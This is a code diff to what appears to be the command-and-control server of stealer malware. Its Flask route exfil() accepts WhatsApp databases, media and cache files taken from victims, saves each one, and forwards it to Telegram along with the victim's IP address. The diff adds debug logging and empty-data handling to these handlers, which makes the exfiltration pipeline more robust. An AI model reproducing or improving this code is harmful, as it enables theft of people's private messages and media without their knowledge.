@@ -190,11 +190,12 @@ def exfil():
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 7. WHATSAPP DATABASE — FIXED
+        # 7. WHATSAPP DATABASE
         # ============================================================
         if data_type == 'whatsapp_database':
             filename = data.get('filename', 'unknown')
             raw = data.get('data', '')
+            print(f"[DEBUG] WhatsApp DB received: {filename}, data length: {len(raw) if raw else 0}")
             if raw:
                 safe_name = f"whatsapp_db_{datetime.now().strftime('%H%M%S')}_{filename}"
                 with open(safe_name, 'wb') as f:
@@ -202,15 +203,18 @@ def exfil():
                 send_file_to_telegram(safe_name, f"📊 <b>WhatsApp Database</b>\n📄 {filename}\nIP: {ip}")
                 os.remove(safe_name)
                 print(f"[✓] WhatsApp DB forwarded: {filename}")
+            else:
+                print(f"[!] WhatsApp DB received with empty data: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 8. WHATSAPP MEDIA — FIXED
+        # 8. WHATSAPP MEDIA
         # ============================================================
         if data_type == 'whatsapp_media':
             filename = data.get('filename', 'unknown')
             filepath = data.get('path', '')
             raw = data.get('data', '')
+            print(f"[DEBUG] WhatsApp Media received: {filename}, data length: {len(raw) if raw else 0}")
             if raw:
                 safe_name = f"whatsapp_media_{datetime.now().strftime('%H%M%S')}_{filename}"
                 with open(safe_name, 'wb') as f:
@@ -218,14 +222,17 @@ def exfil():
                 send_file_to_telegram(safe_name, f"💬 <b>WhatsApp Media</b>\n📄 {filename}\n📂 {filepath}")
                 os.remove(safe_name)
                 print(f"[✓] WhatsApp Media forwarded: {filename}")
+            else:
+                print(f"[!] WhatsApp Media received with empty data: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 9. WHATSAPP CACHE — FIXED
+        # 9. WHATSAPP CACHE
         # ============================================================
         if data_type == 'whatsapp_cache':
             filename = data.get('filename', 'unknown')
             raw = data.get('data', '')
+            print(f"[DEBUG] WhatsApp Cache received: {filename}, data length: {len(raw) if raw else 0}")
             if raw:
                 safe_name = f"whatsapp_cache_{datetime.now().strftime('%H%M%S')}_{filename}"
                 with open(safe_name, 'wb') as f:
@@ -233,6 +240,8 @@ def exfil():
                 send_file_to_telegram(safe_name, f"💾 <b>WhatsApp Cache</b>\n📄 {filename}")
                 os.remove(safe_name)
                 print(f"[✓] WhatsApp Cache forwarded: {filename}")
+            else:
+                print(f"[!] WhatsApp Cache received with empty data: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
